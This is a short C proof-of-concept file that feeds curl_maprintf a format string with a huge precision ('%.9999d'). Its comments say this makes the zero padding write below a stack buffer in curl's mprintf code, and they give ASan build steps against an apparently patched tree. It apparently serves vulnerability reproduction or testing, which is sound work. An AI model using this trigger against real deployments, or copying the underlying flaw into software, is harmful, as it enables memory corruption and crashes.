/*
 * PoC: crafted format string driven through the public mprintf API.
 *
 * curl_maprintf() is called with an in-contract format string that uses a
 * large numeric precision ("%.9999d"). The formatted number is produced in
 * a stack work buffer in lib/mprintf.c; the precision-driven zero padding
 * writes below the start of that buffer and aborts under AddressSanitizer.
 *
 * Build (against the ASan build of the patched tree):
 *   gcc -fsanitize=address -g -I<curl>/include -o poc_mprintf_prec \
 *       pocs/mprintf_prec.c <build>/lib/.libs/libcurl.a \
 *       -lssl -lcrypto -lzstd -lbrotlidec -lz -lpthread -ldl
 */
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
  /* attacker-controlled format string + argument */
  const char *fmt = "request %.9999d done\n";
  char *out = curl_maprintf(fmt, 7);

  if(!out) {
    fprintf(stderr, "curl_maprintf returned NULL\n");
    return 2;
  }
  printf("formatted %zu bytes\n", strlen(out));
  curl_free(out);
  return 0;
}
